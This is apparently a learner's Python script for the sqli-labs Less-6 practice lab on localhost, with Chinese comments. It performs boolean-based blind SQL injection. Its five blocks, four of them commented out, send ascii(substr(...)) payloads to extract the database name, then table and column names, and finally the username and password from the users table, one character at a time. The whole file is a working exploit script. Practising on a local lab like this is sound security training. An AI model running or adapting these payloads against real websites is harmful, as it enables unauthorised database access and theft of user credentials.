#布尔盲注测试database()=?

# import requests
# url = 'http://localhost/sqli-labs/Less-6/?id='
# Database = ""
# test = "database()"
# for i in range(1,100): #i从1到99开始测试，意思是第一个字符到第99个字符（虽然肯定没有那么多）
#     for ascii in range(32,128): #ascii从32到126开始测试，意思是所有可见字符
#         payload = '1" and ascii(substr({},{},1)) = {} --+'.format(test,i,ascii)
#         #payload = 1" and ascii(substr(database(),i,1) = ascii) 
#         Ultimate_payload = url + payload #拼接url和payload
#         response = requests.get(Ultimate_payload)
#         if 'You are in' in response.text:
#             print(Ultimate_payload) #打印出当前的payload
#             Database += chr(ascii) #如果有回显，说明找到了正确的ascii值，将其添加到database变量中            
#             print(Database) #打印出当前的database变量
#             break #跳出循环，开始下一个ascii值测试
#         if ascii == 127: #如果ascii值已经到达127，说明没有找到正确的ascii值，退出程序
#             print(Database)
#             exit(0) #退出程序



#下面是布尔盲注测试=table_name=?

# import requests
# url = 'http://localhost/sqli-labs/Less-6/?id='
# Database = ""
# test = "table_name"
# for i in range(1,100): #i从1到99开始测试，意思是第一个字符到第99个字符（虽然肯定没有那么多）
#     for ascii in range(32,128): #ascii从32到126开始测试，意思是所有可见字符
#         payload = '1" and ascii(substr((select {} from information_schema.tables where table_schema = "security" limit 3,1),{},1))={} --+'.format(test,i,ascii)
#         #payload = 1" and ascii(substr((select table_name from information_schema.tables where table_schema = "security" limit 3,1),i,1))=ascii --+ 
#         Ultimate_payload = url + payload #拼接url和payload
#         response = requests.get(Ultimate_payload)
#         if 'You are in' in response.text:
#             print(Ultimate_payload) #打印出当前的payload
#             Database += chr(ascii) #如果有回显，说明找到了正确的ascii值，将其添加到database变量中            
#             print(Database) #打印出当前的database变量
#             break #跳出循环，开始下一个ascii值测试
#         if ascii == 127: #如果ascii值已经到达127，说明没有找到正确的ascii值，退出程序
#             print(Database)
#             exit(0) #退出程序




#下面是布尔盲注测试=column_name=?

# import requests
# url = 'http://localhost/sqli-labs/Less-6/?id='
# Database = ""
# test = "column_name"
# for i in range(1,100): #i从1到99开始测试，意思是第一个字符到第99个字符（虽然肯定没有那么多）
#     for ascii in range(32,128): #ascii从32到126开始测试，意思是所有可见字符
#         payload = '1" and ascii(substr((select {} from information_schema.columns where table_schema = "security" and table_name = "users" limit 2,1),{},1))={} --+'.format(test,i,ascii)
#         #payload = 1" and ascii(substr((select column_name from information_schema.columns where table_schema = "security" and table_name = "users" limit 2,1),i,1))=ascii --+ 
#         Ultimate_payload = url + payload #拼接url和payload
#         response = requests.get(Ultimate_payload)
#         if 'You are in' in response.text:
#             print(Ultimate_payload) #打印出当前的payload
#             Database += chr(ascii) #如果有回显，说明找到了正确的ascii值，将其添加到database变量中            
#             print(Database) #打印出当前的database变量
#             break #跳出循环，开始下一个ascii值测试
#         if ascii == 127: #如果ascii值已经到达127，说明没有找到正确的ascii值，退出程序
#             print(Database)
#             exit(0) #退出程序




#下面是布尔盲注测试=username=?

# import requests
# url = 'http://localhost/sqli-labs/Less-6/?id='
# Database = ""
# test = "username"
# for i in range(1,100): #i从1到99开始测试，意思是第一个字符到第99个字符（虽然肯定没有那么多）
#     for ascii in range(32,128): #ascii从32到126开始测试，意思是所有可见字符
#         payload = '1" and ascii(substr((select {} from users limit 0,1),{},1))={} --+'.format(test,i,ascii)
#         #payload = 1" and ascii(substr((select username from users limit 0,1),i,1))=ascii --+ 
#         Ultimate_payload = url + payload #拼接url和payload
#         response = requests.get(Ultimate_payload)
#         if 'You are in' in response.text:
#             print(Ultimate_payload) #打印出当前的payload
#             Database += chr(ascii) #如果有回显，说明找到了正确的ascii值，将其添加到database变量中            
#             print(Database) #打印出当前的database变量
#             break #跳出循环，开始下一个ascii值测试
#         if ascii == 127: #如果ascii值已经到达127，说明没有找到正确的ascii值，退出程序
#             print(Database)
#             exit(0) #退出程序



#下面是布尔盲注测试=password=?

import requests
url = 'http://localhost/sqli-labs/Less-6/?id='
Database = ""
test = "password"
for i in range(1,100): #i从1到99开始测试，意思是第一个字符到第99个字符（虽然肯定没有那么多）
    for ascii in range(32,128): #ascii从32到126开始测试，意思是所有可见字符
        payload = '1" and ascii(substr((select {} from users limit 0,1),{},1))={} --+'.format(test,i,ascii)
        #payload = 1" and ascii(substr((select password from users limit 0,1),i,1))=ascii --+ 
        Ultimate_payload = url + payload #拼接url和payload
        response = requests.get(Ultimate_payload)
        print(Ultimate_payload) #打印出当前的payload
        if 'You are in' in response.text:
            Database += chr(ascii) #如果有回显，说明找到了正确的ascii值，将其添加到database变量中            
            print(Database) #打印出当前的database变量
            break #跳出循环，开始下一个ascii值测试
        if ascii == 127: #如果ascii值已经到达127，说明没有找到正确的ascii值，退出程序
            print(Database)
            exit(0) #退出程序